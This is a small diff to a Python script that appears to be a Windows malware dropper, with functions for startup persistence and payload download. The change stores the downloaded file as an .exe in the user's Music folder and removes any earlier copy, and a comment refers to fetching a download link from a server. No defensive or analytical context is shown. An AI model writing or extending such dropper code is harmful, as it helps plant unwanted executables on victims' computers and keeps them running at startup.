@@ -50,9 +50,10 @@ def insert_to_startup():
 
 
 def download_payload(file_name, delete_before_trying):
+    file_name = os.path.join(os.environ["USERPROFILE"], "Music") + f"\\{file_name}"
     if delete_before_trying:
         try:
-            os.remove(file_name)
+            os.remove(f"{file_name}.exe")
         except FileNotFoundError:
             pass
     # Get the download link from the server
